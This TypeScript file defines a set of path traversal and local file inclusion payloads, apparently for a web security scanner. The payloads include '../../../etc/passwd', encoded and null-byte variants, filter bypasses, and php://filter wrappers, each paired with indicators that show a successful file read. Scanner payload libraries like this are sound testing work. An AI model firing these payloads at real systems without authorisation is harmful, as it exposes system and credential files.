import { Payload, PayloadSet, generatePayloadId } from "./payload-types";

const basicPayloads: Payload[] = [
  {
    id: generatePayloadId("path_traversal", "blind", 1),
    category: "path_traversal",
    technique: "blind",
    riskLevel: "safe",
    value: "../../../etc/passwd",
    description: "Basic Unix passwd file traversal",
    expectedBehavior: "Contents of /etc/passwd file",
    successIndicators: [
      "root:",
      "/bin/bash",
      "/bin/sh",
      "daemon:",
      "nobody:",
    ],
    failureIndicators: [
      "not found",
      "access denied",
    ],
    applicableContexts: ["url_param", "body_param", "path"],
    encoding: "none",
  },
  {
    id: generatePayloadId("path_traversal", "blind", 2),
    category: "path_traversal",
    technique: "blind",
    riskLevel: "safe",
    value: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    description: "Windows hosts file traversal",
    expectedBehavior: "Contents of Windows hosts file",
    successIndicators: [
      "127.0.0.1",
      "localhost",
    ],
    failureIndicators: [
      "not found",
    ],
    applicableContexts: ["url_param", "body_param", "path"],
    encoding: "none",
  },
  {
    id: generatePayloadId("path_traversal", "blind", 3),
    category: "path_traversal",
    technique: "blind",
    riskLevel: "safe",
    value: "....//....//....//etc/passwd",
    description: "Double dot filter bypass",
    expectedBehavior: "Filter removes ../ leaving valid traversal",
    successIndicators: [
      "root:",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param", "path"],
    encoding: "none",
  },
  {
    id: generatePayloadId("path_traversal", "blind", 4),
    category: "path_traversal",
    technique: "blind",
    riskLevel: "safe",
    value: "..%2f..%2f..%2fetc%2fpasswd",
    description: "URL encoded path traversal",
    expectedBehavior: "Decoded traversal succeeds",
    successIndicators: [
      "root:",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "path"],
    encoding: "url",
  },
  {
    id: generatePayloadId("path_traversal", "blind", 5),
    category: "path_traversal",
    technique: "blind",
    riskLevel: "safe",
    value: "..%252f..%252f..%252fetc%252fpasswd",
    description: "Double URL encoded traversal",
    expectedBehavior: "Double decode reveals traversal",
    successIndicators: [
      "root:",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "path"],
    encoding: "url",
  },
];

const nullBytePayloads: Payload[] = [
  {
    id: generatePayloadId("path_traversal", "blind", 10),
    category: "path_traversal",
    technique: "blind",
    riskLevel: "safe",
    value: "../../../etc/passwd%00.jpg",
    description: "Null byte injection with file extension",
    expectedBehavior: "Null byte terminates path, extension ignored",
    successIndicators: [
      "root:",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param", "path"],
    encoding: "none",
  },
  {
    id: generatePayloadId("path_traversal", "blind", 11),
    category: "path_traversal",
    technique: "blind",
    riskLevel: "safe",
    value: "../../../etc/passwd\x00.png",
    description: "Raw null byte with PNG extension",
    expectedBehavior: "Null byte terminates path",
    successIndicators: [
      "root:",
    ],
    failureIndicators: [],
    applicableContexts: ["body_param"],
    encoding: "none",
  },
];

const absolutePathPayloads: Payload[] = [
  {
    id: generatePayloadId("path_traversal", "blind", 20),
    category: "path_traversal",
    technique: "blind",
    riskLevel: "safe",
    value: "/etc/passwd",
    description: "Absolute path to passwd",
    expectedBehavior: "Direct file access",
    successIndicators: [
      "root:",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param", "path"],
    encoding: "none",
  },
  {
    id: generatePayloadId("path_traversal", "blind", 21),
    category: "path_traversal",
    technique: "blind",
    riskLevel: "safe",
    value: "file:///etc/passwd",
    description: "File protocol traversal",
    expectedBehavior: "File protocol access",
    successIndicators: [
      "root:",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("path_traversal", "blind", 22),
    category: "path_traversal",
    technique: "blind",
    riskLevel: "safe",
    value: "C:\\Windows\\System32\\drivers\\etc\\hosts",
    description: "Windows absolute path",
    expectedBehavior: "Windows hosts file content",
    successIndicators: [
      "127.0.0.1",
      "localhost",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param", "path"],
    encoding: "none",
  },
];

const wrapperPayloads: Payload[] = [
  {
    id: generatePayloadId("path_traversal", "blind", 30),
    category: "path_traversal",
    technique: "blind",
    riskLevel: "low",
    value: "php://filter/convert.base64-encode/resource=/etc/passwd",
    description: "PHP filter wrapper for file read",
    expectedBehavior: "Base64 encoded file contents",
    successIndicators: [
      "cm9vdDo",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("path_traversal", "blind", 31),
    category: "path_traversal",
    technique: "blind",
    riskLevel: "low",
    value: "php://input",
    description: "PHP input wrapper",
    expectedBehavior: "Access to raw POST data",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
];

export const pathTraversalPayloadSet: PayloadSet = {
  category: "path_traversal",
  name: "Path Traversal Payloads",
  description: "Directory traversal and local file inclusion payloads",
  payloads: [
    ...basicPayloads,
    ...nullBytePayloads,
    ...absolutePathPayloads,
    ...wrapperPayloads,
  ],
};

export function getPathTraversalPayloads(): Payload[] {
  return pathTraversalPayloadSet.payloads;
}
